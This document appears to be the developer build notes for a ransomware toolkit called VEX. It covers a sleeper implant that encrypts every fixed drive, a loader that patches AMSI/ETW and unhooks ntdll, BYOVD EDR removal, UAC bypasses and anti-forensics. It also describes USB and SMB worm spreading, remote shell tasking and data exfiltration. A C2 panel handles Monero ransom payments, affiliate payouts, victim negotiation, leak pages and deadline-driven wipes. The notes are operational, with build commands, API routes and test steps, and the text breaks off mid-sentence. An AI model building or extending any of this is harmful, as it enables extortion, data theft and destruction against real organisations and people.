# VEX / Plainfield — build notes

Sleeper implant → operator-armed detonation → ransomware + decrypter.
Everything lives in `D:\Vexpayload` plus the C2 under `server/`.

## Runtime flow

```
start
 ├─ UAC elevate (relaunch as admin)
 ├─ load %ProgramData%\VEX\state.bin
 │    phase 2 (complete)  → remove persistence, self-delete, exit
 │    phase 1 (detonating)→ resume encryption with the stored key
 │    none                → fresh AES-256 key + VID, save phase 0
 ├─ beacon /api/checkin (retry ≤96×, min(15m, ping interval))
 ├─ install persistence (Run keys + SYSTEM logon task + installed copy)
 ├─ start USB watcher + SMB spray (dormant phase only)
 ├─ sleeper loop /api/ping
 │    "sleep"    → jittered sleep, poll again
 │    "detonate" → phase 1, run detonation
 │    "kill"     → remove persistence, delete state, self-delete
 └─ detonate
      kill blockers → BYOVD/EDR → wipe recovery → notes →
      encrypt (journal) → phase 2 → cleanup → self-delete
```

## Payload modules (`Vexpayload.cpp`)

| Section | Namespace | What it does |
|---|---|---|
| config | `vex::config` | RSA modulus, C2 host/paths, timing, note name, SMB/USB knobs |
| utils | `vex::utils` | base64, UTF-8, exact IO, journal escaping, state paths, self-delete, privilege enable |
| evasion | `vex::evasion` | RTCore64 BYOVD (Win10 19041–19045 only), EPROCESS protection strip, recovery/event-log wipe, USN/prefetch/shimcache/BAM/PowerShell/RDP anti-forensics, silent UAC bypass (fodhelper/computerdefaults); outcome reported as `evasion` |
| crypto | `vex::crypto` | AES-256-GCM chunked encryption, RSA-2048 wrap, journal write |
| comms | `vex::comms` | checkin, ping, **report** (`/api/report`), kill switch parsing |
| err | `vex::err` | crash/terminate telemetry to the C2 |
| state | `vex::state` | `%ProgramData%\VEX\state.bin` — VID + AES key + phase |
| persist | `vex::persist` | installed copy, HKCU/HKLM Run values, SYSTEM logon task (both carry `--spread` / tuned `--ping-ms`), accessibility IFEO (`utilman`/`sethc`) |
| spread | `vex::spread` | USB watcher (payload + LNK bait), SMB /24 spray (PsExec-style service) |
| sleeper | `vex::sleeper` | dormancy loop, returns `detonate` / `kill` |
| engine | `vex::engine` | threaded file walker; journal `~DF3A9.tmp` under the user/system temp |
| detonate | `vex::detonate` | process/service blockers, VSS/event-log wipe, notes, encryption, reporting |
| pardon | `vex::pardon` | root release: fetch signed decrypter, decrypt locally, remove artifacts, self-delete |

### Kill switch
`detonate` column: `0` sleep, `1` arm, `2` self-destruct.
Panel routes: `/admin/detonate/<vid>`, `/admin/detonate_all`, `/admin/kill/<vid>`,
`/admin/detonate_reset/<vid>`. Ping answers `{"status":"kill"}` for `2`.

### Pardon (root only)
`pardon` column: set by root; ping answers `pardon` (overrides a stale arm).
The payload then pulls the per-victim decrypter from `/api/pardon_exe`
(HMAC-signed, same protocol as ping), runs it silent against the local journal,
deletes notes/persistence/state and self-deletes; the panel marks the row
`pardoned` when the `pardon_done` report arrives. Routes:
`/admin/pardon/<vid>`, `/admin/pardon_all`, bulk action `pardon`.
The decrypter build must be available on the panel (`exe_build_available`).

### Locations
- State: `%ProgramData%\VEX\state.bin` (hidden/system; keeps VID + key across reboots)
- Installed copy: `%ProgramData%\VEX\WindowsSecurityHealthAgent.exe`
- Journal: `~DF3A9.tmp` — `%LOCALAPPDATA%\Temp` → `%TEMP%` → `%WINDIR%\Temp` → `C:\`
  (hidden; a SYSTEM-service run lands in the system profile, which the decrypter probes).
  Format **v2**: `VXJ2` header, then CRC32-framed records carrying the plaintext
  SHA256, size and both paths. Legacy text journals are still read.
- Encrypted files: **original names and extensions kept**; contents replaced by VEX2
- Notes: `HOW_TO_RESTORE_FILES.txt` in every fixed-drive root
- Lateral movement: USB watcher + SMB spray only run when
  `config::kEnableLateralMovement` is `true` and `--no-spread` was not passed

## Engine 2.0 (`vex::engine`)

Container **v2** layout:

```
"VEX2" | u32 flags | u64 original_size | u32 stride | u32 chunk_size | u64 chunks
per chunk: u8 mode (0 raw, 1 encrypted) | u32 len | raw bytes
           OR 12B nonce | len bytes ciphertext | 16B tag
```

- **Long paths**: every Win32 call goes through `utils::extended()` (`\\?\`,
  `\\?\UNC\`); the journal stores canonical paths.
- **ACL-protected files**: `SeBackupPrivilege` + `FILE_FLAG_BACKUP_SEMANTICS`.
  Sharing locks are not bypassed — blockers kill Office/SQL first.
- **Intermittent encryption**: files > 100 MiB encrypt every stride-th chunk
  plus the tail (~10 MiB of AES per big file). `flags` bit0 marks the mode.
- **Priority sweep**: `.vbk .vbh .vib .vhd .vhdx .edb .mdf .ldf .bak .ost .pst
  .sql .dmp` are encrypted before the general walk (2-minute / 20k-file budget).
- **Cloud folders**: `%OneDrive%`, `%OneDriveCommercial%`,
  `%USERPROFILE%\Dropbox`, `Google Drive`, `iCloudDrive`.
- **Network shares**: `NetShareEnum` on reachable hosts (≤32), mount disk shares
  with the current token, encrypt, then disconnect. Admin/IPC/print shares are
  skipped.
- **Pacing**: HDD detection via seek-penalty IOCTL caps threads at 4; optional
  `--throttle N` sleeps `1000/N` ms per file.
- **Fail closed**: if the journal cannot be opened, nothing is encrypted.

### Dev harness (no beacon, no persistence, no spread, no elevation)

```powershell
# encrypt one tree, keep the key for the decrypter
Vexpayload.exe --encrypt C:\TestTarget --journal C:\temp\test.jnl --key-out C:\temp\key.txt --stats

# classification only
Vexpayload.exe --encrypt C:\TestTarget --dry-run

# local shares (read-only)
Vexpayload.exe --shares
```

Flags: `--encrypt <path> --journal <p> --key-out <p> --dry-run --stats
--throttle N --threads N --no-priority --persist-preview`.

Detonation uses `config::kEncryptOnlyTestRoot`, which is **false** by default:
a real DETONATE walks every fixed drive (and cloud folders when enabled). For a
scoped test, use the harness instead:
`Vexpayload.exe --encrypt C:\TestTarget --journal ... --key-out ...`. Do not
press DETONATE on a host you intend to keep.

### Decrypter 7.0

`VexC2/decrypter_template.cpp` — the victim-facing tool, generated per victim
with `{{AES_KEY_B64}}`, `{{VID}}` and `{{C2_URL}}` injected.

- **Containers**: v2 (intermittent) and legacy v1, long-path aware, backup
  semantics, read-only/attribute preservation.
- **Concurrency**: `--workers N` (default cores, max 8) with a work queue.
- **Resume**: `<journal>.done` sidecar records completed entries (base64 paths);
  re-running skips them and continues. Only a full clean run removes the journal.
- **Check mode**: `--check` verifies every GCM tag and writes nothing.
- **Filters**: `--list`, `--only <substr>`, `--exclude <ext>` (repeatable).
- **Non-destructive**: if the original exists, output goes to `<name>.restored`
  unless `--force`.
- **Safety/elevation**: self-elevates once (UAC) unless `--no-elevate`; console
  pause only when interactive and not `--quiet`; `--no-pause` for unattended.
- **C2 integration**: reports `start`, then `ok/failed/skipped/bytes` to
  `/api/report` (kind `decrypter`) when the URL was injected.
- **Exit codes**: 0 clean, 1 partial failures, 2 fatal.
- **Panel**: serves the `.cpp` and the compiled `.exe` (cache keyed by
  key+vid+url); portal releases both only when the victim is `paid`.

```
vex_decrypter.exe --journal <path> --key <b64> --quiet --no-pause
vex_decrypter.exe --journal <path> --key-file key.txt --check
```

### Decrypter 7.0 checks (this build)

- Real encrypt → build → decrypt round trip: **byte-identical**, journal removed.
- Resume: partial `--only` run keeps journal; second run reports `skipped: 1`.
- `--check` verifies tags and leaves the encrypted tree untouched.
- `--list` prints entries; `.restored` sidecar protects an existing original.
- C2 report received on the stub HTTP server (`vid=...&kind=decrypter&detail=ok=...`).
- Harness outputs (key file, journal) are now excluded from encryption.
- `--selftest` runs a known-answer AES-256-GCM vector through BCrypt.
- Journal v3 restores creation/access/write timestamps; v2 journals still read.
- Keys accepted as base64 or 64-char hex; `--key-file` supported.
- x86 and x64 builds; both pass selftest and restore in the suite.
- French/German/Portuguese UI, drag-and-drop journal, SeBackup/SeRestore.

### Engine 2.0 checks (this build)

- Fixture tree (nested, 299-char path, empty, read-only, 110 MiB): encrypt →
  decrypt → **7/7 byte-identical** SHA256.
- Intermittent header on 110 MiB: `flags=1 stride=11 chunks=1760` (~160 AES chunks).
- Legacy v1 container: decrypts byte-identical.
- Locked file (share=None handle): `failed=1`, original untouched.
- Unwritable journal: engine refuses, originals untouched.
- Harness leaves no `%ProgramData%\VEX`, no temp journal, no Run keys.

## Loader (`loader/xloader.cpp`)

Delivers the payload without touching disk as a PE. On start it:

0. **Integrity**: the appended blob uses footer v3 (`VXPAY003` — plaintext size,
   CRC32, per-build KDF salt, AES-GCM nonce + tag, HMAC-SHA256 over the
   ciphertext). The blob key is derived with HMAC-SHA256 from a loader-compiled
   secret and the footer salt, so the payload is sealed rather than merely
   obfuscated; a tampered stager or stage blob is rejected before mapping.
   `xloader.exe --stage https://host/api/stage --token ...` fetches the same
   signed blob at runtime instead of carrying it. Legacy `VXPAY002` (XOR)
   stage blobs are rejected unless the loader is built with
   `VEX_ALLOW_LEGACY_STAGE=1` (transitional deployments only).
1. Self-elevates unless `--no-elevate` (relaunch keeps the arguments).
2. Hides its console when Windows created one for the process (never hides an
   operator's terminal).
3. Builds **indirect** syscall stubs: SSNs are parsed from the on-disk ntdll
   image, then each stub does `mov r10,rcx; mov eax,ssn; jmp ntdll!syscall`
   (RIP never leaves ntdll). Direct `syscall;ret` is only a fallback.
4. Restores ntdll's entire `.text` from the pristine on-disk copy (per-prologue
   restore remains as a fallback).
5. Patches AMSI (`AmsiScanBuffer` and `AmsiScanString` → `E_INVALIDARG`) and
   five ETW writers.
6. Loads the payload: `--stage` (signed HTTP fetch), `--file <pe>` for tests,
   otherwise the AES-256-GCM sealed blob appended by `tools/pack.py`.
7. Maps it manually (headers, sections, relocations, imports, TLS callbacks,
   `.pdata` registration, per-section protections), then calls the entry point.

All sensitive names in the loader are compile-time XOR-obfuscated, and
`tools/opsec_check.py` fails the build if any high-signal plaintext returns.

Flags: `--inspect` (parse + print, no execution), `--no-amsi`, `--no-etw`,
`--no-unhook`, `--no-elevate`, `--vm-check`, `-v`.

### Build + pack

```powershell
# payload (static CRT, needed for manual mapping)
& 'D:\VisualStudio2022\MSBuild\Current\Bin\amd64\MSBuild.exe' `
  'D:\Vexpayload\Vexpayload.vcxproj' /p:Configuration=Release /p:Platform=x64 /m

# loader
& 'D:\VisualStudio2022\MSBuild\Current\Bin\amd64\MSBuild.exe' `
  'D:\Vexpayload\loader\xloader.vcxproj' /p:Configuration=Release /p:Platform=x64 /m

# pack -> x64\Release\stager.exe
python tools\pack.py loader\x64\Release\xloader.exe x64\Release\Vexpayload.exe x64\Release\stager.exe
```

`stager.exe` = loader + AES-256-GCM sealed payload + footer v3 (`VXPAY003`,
size, crc32, KDF salt, nonce, tag, HMAC-SHA256). Packing strips a previous
block, so it is repeatable.

### Loader smoke test (no beacon, no machine changes)

```powershell
.\x64\Release\stager.exe --selftest --no-elevate -v
```

Expected: `[selftest] payload alive`, `[selftest] crypto ok`, exit 0. This
proves the mapped image runs CRT, threads and bcrypt. `--inspect` prints the
payload size/entry/image without executing anything.

## C2 (`VexC2/` — canonical, v3.0 production)

```
VexC2/
  app.py                 routes, csrf, auth, portal, api, analytics
  c2db.py                schema/migrations, events, settings, operators, TOTP, backup
  crypto_util.py         RSA unwrap + v1/v2 container decryption
  decrypter_build.py     on-demand MSVC compile + exe cache
  payments.py            monero wallet-RPC verification
  notify.py              telegram / webhook notifications
  run_prod.py            waitress entry point
  start.ps1              windows production launcher
  decrypter_template.cpp served (cpp and exe)
  templates/             11 pages incl. analytics
  build_cache/           compiled decrypters (keyed by sha256)
  deploy/                nginx.conf + systemd unit (repo root)
```

Operator console:
- **Root R1**: distinct gold root theme + `ROOT` badge; root rows are hidden
  from the admin operator list; root actors render as a `ROOT` pill in events;
  victim pages show a `ROOT OVERRIDE` banner. Destructive root actions
  (`/admin/root/panic`, `/admin/root/keys.zip`, `/admin/root/release/<vid>`)
  require a **step-up** within 5 minutes (`/admin/root/stepup`, TOTP or root
  password). PANIC requires typing `DESTROY` and marks the whole fleet
  self-destruct; the keys ZIP exports per-victim key material with an audit
  event; ROOT RELEASE marks a victim paid without payment. When a POST-only
  root action is attempted with an expired step-up, the step-up page replays
  the action as a POST (never a GET redirect), so the browser cannot land on
  `405 Method Not Allowed`. The panel must run under waitress (installed from
  `requirements.txt`); the Flask fallback is single-threaded and is only for
  development.
- **Root R2**: `/admin/root/schedule` (fleet detonation at a server-time
  datetime, fired by the 5 s housekeeping thread), `/admin/root/lockdown`
  (admins read-only, banner shown), `/admin/root/deadman` (hours + `pardon` or
  `kill` when root has been silent), `/admin/operators/<id>/timeline` plus a
  read-only view-as mode, `/admin/root/audit-freeze` (admins cannot open the
  event log) and `/admin/root/audit-snapshot` + `/admin/root/audit-verify`
  (HMAC-SHA256, key from `VEX_AUDIT_KEY` or the session secret). Step-up is
  bound to client IP + User-Agent hash; the keys ZIP is limited to one per
  minute and carries a per-export watermark (`keys_export.json`).
  `VEX_NO_HOUSEKEEPING=1` disables the scheduler thread (used by tests).
- **Root R3**: `/admin/campaign/<id>/nuke` revokes every campaign build (deletes
  stager/stage files under `dist/campaigns`, marks builds `revoked`, clears the
  campaign host, deactivates it and kills its victims);
  `/admin/root/rotate-master` re-seals victims keys and exfil chunks under a new
  master (pre-rotation SQLite backup; `tools/vault_rotate.py` for offline use);
  `shadow` operator role is root-equivalent but invisible to admins; the
  schedule/deadman tickers also run on every `/api/ping`, so a panel restart
  does not miss a due schedule.
- **Definitive panic**: its own root page `/admin/root/definitive` (linked from
  the bottom of the root console as a separated danger zone).
  `/admin/root/panic-pins` stores five hashed, distinct
  4–8 digit pins; `/admin/root/burn` requires root step-up plus all five pins
  (5 wrong attempts lock it for 10 minutes). On success it queues
  `detonate=2` to every victim, then destroys the SQLite DB (+WAL/SHM), uploads,
  decrypter build cache, `priv.pem`, `.secret`/`.master` (when not env-provided)
  and, unless `VEX_PANIC_BUILDS=0`, `dist` and the built payload/loader
  binaries. The panel answers `kill` to any ping for `VEX_PANIC_EXIT_SECONDS`
  (default 600) and then exits; the source tree is not touched.
  `VEX_PANIC_DRY=1` returns the target list without destroying anything.
- **Shadow hardening**: shadow rows cannot be deleted by admins or by another
  shadow (root only), the audit-freeze exemption covers shadow, and
  `/admin/root/2fa` targets the current shadow operator instead of root.
- **C2 audit hardening (this build)**: `/api/report` now requires the per-victim
  HMAC like ping/exfil; `kill`/bulk-kill and arming clear a stale `pardon`
  flag (pardon still wins at ping); command claims are a single atomic
  `UPDATE ... RETURNING`; a re-checkin never overwrites an existing victim key
  (first key wins, so earlier ciphertext stays recoverable); payment polling
  credits exactly one victim per
  `txid` (unique ledger index), records the USD amount, and compares against
  the **escalated** price; operator deletion/demotion is enforced server-side
  per request (sessions are revoked and roles re-synced); manual AES-key
  overrides are sealed under the master before storage; exfil filenames are
  unique per upload; shadow actions get a `SHADOW` pill while root gets `ROOT`.
- **C2 audit batch 2**: `/api/stage` is disabled unless an `api_token` is
  configured (stagers must send `X-Vex-Token`); signed requests are de-duplicated
  for 300 s (`vid|path|ts|sig|Host` replay cache); XMR pool addresses are
  assigned uniquely across active victims (deterministic reuse only when the pool
  is exhausted); exfil v1 carries a per-file `xfer` id so concurrent uploads for
  one victim cannot overwrite chunks; audit freeze now also covers reports,
  exports, commands and exfil views; destructive root actions require a
  separate 16-digit step-up password (PBKDF2 hash in the `stepup_pass_hash`
  setting), not TOTP enrollment. The unlock lasts 5 minutes and is bound to
  IP + user-agent.
- **Business-state hardening**: every paid transition clears `detonate` and
  `pardon`, `api_ping` sleeps for paid/pardoned victims even with a stale arm
  flag, and paid/pardoned/dead victims reject detonate, kill, and lock/wipe
  commands. Manual "mark paid" books the remaining quote and closes the invoice;
  root release voids the invoice without revenue; refunds below the invoice
  revert the victim to `negotiating`. Payout balances reserve `requested` and
  `approved`, reject over-requests transactionally, and enforce transitions.
  Campaign tokens are accepted by `/api/*` and tag the victim's `campaign_id`;
  nuked campaigns cannot be recompiled. Proof uploads only consume a retry after
  a successful decrypt; exfil v1 requires `xfer` for multi-chunk uploads and
  refuses incomplete assemblies; housekeeping is serialized; duplicate manual
  txids return a flash instead of 500; victim delete purges operational files
  while preserving the money ledger.
- **Harness isolation**: `--safe`, `--persist-preview`, `--selftest`,
  `--shares`, and `--net-enum` bypass the implant single-instance mutex; the
  mutex check resets `LastError` before `CreateMutexW` so a stale startup error
  cannot fake a second instance.
- **CSRF on every POST** (`SameSite=Lax` + per-session token), destructive
  actions are **POST-only** (`GET /admin/detonate/...` → 405).
- **Accounts**: pbkdf2 200k, roles admin/viewer, **TOTP + single-use backup
  codes** (hashed), login throttle 8/min/IP, optional admin IP allowlist.
- **Dashboard**: stats incl. revenue, filters, pagination, bulk actions,
  15 s live counters; **analytics page** with 14-day checkin/paid series,
  OS and status breakdowns, conversion rate.
- **Victim page**: keys, manual override, tags, price, XMR, notes, chat with
  unread badges, per-victim event timeline.
- **Decrypter delivery**: `.cpp` and **compiled `.exe`** built server-side on
  first request (cache keyed by key hash), admin and paid-portal routes.
- **Proof of decryption**: sample upload decrypted server-side (v1/v2).
- **Payments**: manual or **wallet-RPC auto-verify** (address + amount match),
  optional background poller (`VEX_PAYMENTS=1`), manual "check now" button.
- **Notifications**: Telegram or Discord-compatible webhook for new victims,
  payments, detonate/kill and payload reports.
- **Housekeeping**: one-click DB backup download, startup snapshots to
  `VEX_BACKUP_DIR` (keeps `backup_keep`), retention pruning of events/reports.
- **Exports**: victims/reports CSV. **API**: `/admin/api/overview` JSON.

Payload API: `/api/checkin`, `/api/ping` (`sleep|detonate|kill`), `/api/report`,
`/api/exfil`, `/api/stage` (signed payload blob for runtime staging).
Panel: `/admin`, `/admin/analytics`, `/admin/victim/<vid>`, `/admin/reports`,
`/admin/events`, `/admin/settings`, `/admin/operators`, `/admin/backup`,
`/admin/payments/check`, `/admin/export/*`, `/admin/api/overview`,
`/admin/decryptor/<vid>`, `/admin/decrypter_exe/<vid>`.
Portal: `/portal`, `/portal/view`, `/portal/proof`, `/portal/decrypter`,
`/portal/decrypter_exe`.

Env: `VEX_PASS`, `VEX_DB`, `VEX_PRIV`, `VEX_SECRET`, `VEX_SECURE_COOKIE=1`,
`VEX_ADMIN_IPS`, `VEX_BACKUP_DIR`, `VEX_PAYMENTS=1`, `VEX_WEBHOOK` or
`VEX_TG_TOKEN`+`VEX_TG_CHAT`, `VEX_VCVARS` (explicit vcvars64 path),
`PORT`, `VEX_THREADS`.
`VEX_AUDIT_KEY` (HMAC key for signed audit snapshots; defaults to the session
secret), `VEX_NO_HOUSEKEEPING=1` (disable the schedule/deadman thread).
`run_prod.py` refuses to start without `VEX_MASTER` (or `.master`);
`VEX_ALLOW_PLAINTEXT=1` is the development escape.

```powershell
cd D:\Vexpayload\VexC2
pip install -r requirements.txt
$env:VEX_PASS = "replace-me"           # seeds admin
python run_prod.py                      # waitress, or: .\start.ps1
.\ngrok.exe http 5000
```

Startup: loads `priv.pem`, migrates old DBs to the 19-column shape, seeds
settings, creates the first operator, prunes old telemetry, optional backup
snapshot, optional payment poller.

Self-test: `python tools\c2_selftest.py` — **133 checks** (csrf, auth, roles,
TOTP + backup codes, API, portal, proof, exe build, payments stub, webhook stub,
backup, prune, analytics, migration).

`server/` holds the earlier standalone copy of the C2 and its decrypter
template; `VexC2/` supersedes it and can be used alone.

## Campaign build (final layer)

One command builds and tests everything:

```powershell
.\build.ps1 -Test              # payload-free suites only (C2, decrypter, fuzz)
.\build.ps1 -LabTests          # payload execution: lab/VM only, needs VEX_ALLOW_PAYLOAD=1
.\tools\ci.ps1                 # build + opsec + fuzz; -Lab adds stage/E2E
.\build.ps1 -ForceTls          # production build: certificate verification mandatory
```

> **Payload execution is lab-only.** `-Test` never runs the compiled payload:
> the decrypter suite generates its containers in Python, and the staging/live
> E2E scripts refuse to run unless `VEX_ALLOW_PAYLOAD=1` is explicitly set.

- `dist\BUILD.txt` records source timestamp, sizes and hashes; the script refuses
  to finish if the stager is older than the newest source.
- **Multi-host C2**: three endpoint slots with per-host retry; `--insecure`-style
  certificate skipping is limited to ngrok/localhost unless `-ForceTls` is used.
  The panel can push `c2_host`; payloads persist it in `%ProgramData%\VEX\c2h`.
- **Spread (opt-in, apex pass)**: `--spread` enables the worm; detonation never
  touches SMB unless `kEncryptNetworkShares=true`.
  USB: `WM_DEVICECHANGE` monitor, USB bus-type check, hidden `.vx` folder,
  randomized payload names, **per-lure VBS + matching decoy PDF** (root +
  `Invoices\` + `Scans\`), company/month-personalized names from
  `RegisteredOwner`/hostname, compile-stamp marker that refreshes on a new
  build, free-space/write checks, timestomping, `usb on|off|status` control.
  SMB: adapter + route + ARP + domain (`NetServerEnum`) discovery,
  RFC1918-only, CIDR allow/deny, 16 workers with jitter, 64-host cap,
  optional credential pairs, remote `vx.id` marker, SCM → cmd-wrapper → WMI
  fallback chain, randomized names, reboot-time cleanup hint.
  Remote control: `spread on|off|status`, `netenum`, `smbexec <host>|<cmd>`;
  harness `--net-enum` prints candidates (lab-only under the no-execution rule).
  Delivery prefers a **staged loader** (loader prefix + `--stage/--token`, payload
  pulled from C2 and HMAC-verified) with full-stager fallback; a persistent
  `%ProgramData%\VEX\hosts` history suppresses retries for 7 days;
  `smbexec` runs an operator command with stdout captured over ADMIN$/C$.
- **Task queue**: payload polls every 5 min for `shell`, `pull`, `push`, `lock`,
  `uninstall`, `wipe`, `reboot`, `ls`, `recon`, `exfil`, `screenshot`, plus lateral
  reconnaissance (`admins`, `sessions`, `shares`, `domain`, `users`); output returns
  base64 and lands in `/admin/commands`. Queue v2 adds priority, per-command
  `max_attempts`/`timeout_s`, cancel, and automatic requeue/fail on dispatch timeout.
- **Negotiation automation**: editable templates (`first`, `deadline`, `paid`),
  one auto-reply per cooldown window when a victim messages the portal, and a
  deadline chat message pushed when escalation fires.
- **Affiliates**: per-operator commission %, payments attributed to the operator
  who recorded them, payout ledger and live balance owed (`/admin/affiliates`).
- **Deadline engine**: invoice id, deadline, escalation steps (default 24 h +50%,
  72 h +100%), and a configurable deadline action (`none`, `lock`, `wipe`) executed
  by a panel thread; manual payments ledger credits partial amounts and auto-marks
  paid at the effective price.
- **C2 v3**: atomic `messages` table (attachments, per-side read state,
  polling, unified inbox), campaigns + assignment + build-config artifacts,
  affiliate self-service portal with payout request/approve, negotiation step
  machine, invoice PDF, signed leak download tokens + countdown/onion, hash-chained
  audit log (`/admin/audit/verify`), session idle timeout, checkin rate limit,
  2FA enforcement, `/healthz` + `/admin/metrics`, schema migrations, and the
  exfil v2 API (manifest + resumable HMAC chunks + at-rest encryption +
  `/admin/exfil/<id>` rebuild).
- **Postgres option**: `VEX_DB_URL=postgresql://user:pass@host/db` switches the
  data layer (psycopg2 + `pg_dump` for backups); SQLite stays the default. The
  SQLite suite remains the CI gate, and `tools\pg_integration.py` runs the real
  Postgres smoke test when `VEX_TEST_PG` points at an empty database.
- **Key custody**: with `VEX_MASTER` (or `VexC2\.master`), victim keys are sealed
  with AES-256-GCM at rest (`enc:v1:`); a stolen DB alone is useless.
  `python tools\vault_migrate.py` seals an existing database.
- **Journal mirroring**: detonation copies the journal to every fixed-drive root.
- **GUI decrypter**: the generated exe accepts `--gui` (journal picker, key field,
  progress bar) and `--lang en|es`; console mode unchanged. The summary reports
  how many files were hash-verified against the journal v3 (timestamps + SHA256) record.
- **CI + fuzzing**: `tools\ci.ps1` runs build+suites, the opsec string gate, the
  container mutation fuzzer (`tools\fuzz_container.py`) and the live E2E.
- **Signing pipeline**: `build.ps1 -Sign -Pfx cert.pfx` signs the payload and
  loader **before packing** (the stager must remain unsigned: Authenticode would
  append a cert table after the VXPAY003 footer). It then writes
  `dist/BUILD_MANIFEST.json` with sizes/hashes/signer thumbprints and a detached
  HMAC sidecar when `VEX_MANIFEST_KEY` is set; `tools/verify_manifest.py` checks
  it. `tools/sign.ps1` alone only signs payload/loader and requires a cert.
- **Signed protocol**: checkin returns a per-victim secret (stored sealed). Ping and
  exfil must carry `X-Vex-Ts` + `X-Vex-Sig` (HMAC-SHA256 over `ts|path|body`),
  are rejected outside a 300 s window and on replay; the secret is kept in
  `%ProgramData%\VEX\sec` and padded while dormant.
- **Live E2E**: `python tools\e2e_live.py` starts a throwaway panel, runs the real
  stager against it over HTTP (`--c2 http://127.0.0.1:PORT`), then verifies checkin,
  API-token enforcement, sealed keys, a shell round-trip, byte-identical exfil and
  a real screenshot upload.
- **Remote tasking extras**: `ls`, `recon` (host/user/domain/OS/processes),
  `exfil <path>` (1 MiB chunks to `/api/exfil`), `screenshot` (GDI capture, chunked).
- **API token**: when `api_token` is set in settings, every `/api/*` call must carry
  `X-Vex-Token`; the payload sends the compiled `kApiToken`.
- **Leak page**: `/leak/<vid>` lists staged files, invoice and deadline.
- **Persistence**: SYSTEM logon task + Run keys + a service fallback that launches
  the payload detached at boot.
- **Dormant key**: the AES key is XOR-padded with fresh randomness for the duration
  of every sleep, then restored.
- **Dormant image obfuscation**: `--sleep-crypt` makes each dormancy cycle launch
  a helper copy of the payload (`--sleep-helper <pid> <ms> <map> <event>`), which
  suspends every payload thread, XOR-scrambles the whole mapped image, sleeps,
  restores it and resumes the threads. The helper is the same binary and exits
  after the cycle; on any helper failure the parent falls back to a plain sleep.
  The option is **off by default** (a helper process per sleep is observable
  process-creation telemetry).
  Harness: `Vexpayload.exe --sleep-crypt --sleep-crypt-ms 12000 --pid-out <file>`;
  `tools/mem_scan.py <pid> VEX_MEM_MARKER_9f3a7c` reads 0 while the helper has the
  image scrambled and >=1 during a plain sleep. `tools/sleep_selftest.py` (and
  `build.ps1 -MemTests` with `VEX_ALLOW_PAYLOAD=1`) automates both cases.
  `tools/lab_matrix.ps1` runs the scripted subset and prints the VM checklist;
  record outcomes in `docs/LAB_RESULTS.md`.
  Scope: the **image** is obscured; heap/stack secrets are not covered, and the
  helper child is a separate process. Headers are scrambled together with the
  image during dormancy but not permanently wiped. Call-stack spoofing was
  evaluated and is **not shipped** in this build (needs unwind-metadata work and
  a separate lab pass).


## Safe VM test order

1. **Crypto only** — start C2, run:
   `stager.exe --no-persist --no-spread --ping-ms 5000`
   (or `Vexpayload.exe` directly; both are the same payload). Confirm the row
   appears and `last_ping` ticks.
2. **Arm** — in a disposable VM only, press DETONATE. Default scope is every
   fixed drive (`kEncryptOnlyTestRoot=false`). To test a scoped tree instead,
   use the `--encrypt C:\TestTarget` harness; check that files carry the `VEX2`
   header, the journal `~DF3A9.tmp` exists under `%LOCALAPPDATA%\Temp`, and
   `HOW_TO_RESTORE_FILES.txt` is at the drive root.
3. **Decrypter** — download it from the victim page, compile, run, confirm files return.
4. **Persistence** — run without `--no-persist`; reboot the VM before arming; the
   sleeper must return with the same VID (state file) and keep polling.
5. **Kill switch** — arm, then KILL before the next ping; the payload must
   remove Run keys/task and delete itself.
6. **USB** — insert a stick, confirm `SysUpdate.exe` + `Invoice.pdf.lnk` on it.
7. **SMB** — two VMs on the same virtual network, same local admin password;
   confirm a service-launched copy appears as a new victim row.

## Remediation pass — 2026-11-23

- **Payload registration:** `/api/checkin` delivers the HMAC secret only on first
  registration. Existing victims must sign the check-in with `X-Vex-Ts/X-Vex-Sig`;
  unsigned metadata updates are rejected. Re-delivery to a VID holder is gone.
- **Decrypter release:** `/api/pardon_exe` requires `pardon=1`; the portal
  "proof" sample is one-time per victim (a failed attempt consumes it).
- **Root state:** step-up replay actions are stored server-side (only a random
  token is in the session cookie); root/shadow 2FA enrollment requires the
  current password; `require_2fa` covers all privileged roles.
- **Vault:** `VexC2/.master` takes precedence over `VEX_MASTER`; rotation writes a
  durable `.master` atomically, verifies every row/chunk, and refuses concurrent
  rotation. `VEX_MASTER_FILE` can relocate the master for tests.
- **Audit/backup:** event appends are serialized, the chain head and prune anchor
  are tracked, new events carry an HMAC, and `/admin/backup` requires root+step-up
  and redacts root/shadow/TOTP data.
- **State machine:** deadline locking skips pardoned/paid/dead victims; pardon
  and payment cancel queued `lock`/`wipe`; command completion is bound to the
  victim and dispatched state.
- **Payload recovery:** ciphertext is fsynced and replaced with write-through;
  torn journals are trimmed before append; RNG failures abort; a named mutex
  prevents concurrent journal writers; `wipe` parses VXJ2; `kill` keeps recovery
  material when a journal exists; state saves are atomic and checked; harness
  `--key-out` refuses to overwrite and aborts on write failure; elevation keeps
  the original argument tail; `--no-shares` no longer starts the SMB spray and
  mapped network drives are skipped unless explicitly enabled.
- **Loader:** PE headers/sections/relocations/imports are bounds-checked;
  System32-only DLL search; certificate validation is always on (cleartext
  staging only for loopback); TLS callbacks run after section protections;
  syscall stubs are RX after writing; `--inspect` no longer elevates/patches.
- **Build:** a random per-build stage key is generated into
  `loader/stage_key.h`, compiled into the loader, and read by `pack.py`/
  `verify_spread.py`; the old public constant is gone. `build.ps1` freshness
  includes tools/scripts and fails on a missing source baseline.
- **Decrypter:** legacy v1 rewinds before reading the chunk count; zero-chunk
  files are rejected; journal parse anomalies are fatal and keep the journal;
  journal targets must be drive-absolute, not UNC/device/GLOBALROOT, and
  `orig==enc`; `bcrypt.dll` is loaded from System32; GUI honors check/force;
  elevation preserves spaced paths; output is flushed and write-through.
- **Tests/tools:** `c2_selftest` uses a temp uploads dir, temp RSA key and audit
  key; `RSA.py` refuses to overwrite `priv.pem`; `pg_integration.py` requires a
  test-DB marker and a signed report; stage/e2e suites propagate failures.

## Known limits

- **UAC bypass** tries the auto-elevated `CMSTPLUA` COM object
  (`ICMLuaUtil::ShellExec`, no registry footprint) first, then
  `fodhelper.exe`/`computerdefaults.exe` via the HKCU `ms-settings` command
  key (10 s child-event wait, keys removed on both paths); the `runas` prompt
  remains the fallback. The stager performs the same COM-first elevation
  before mapping the payload, so double-clicking `stager.exe` does not need a
  pre-elevated shell. Patched or policy-blocked on some Win11 builds.
- **Anti-forensics** is best-effort: USN journals, prefetch, shimcache value,
  BAM user keys, PSReadLine history and RDP caches. SRUM/Amcache files are
  locked by the OS and skipped when held open.
- **IFEO persistence** uses `utilman.exe`/`sethc.exe`; it starts the installed
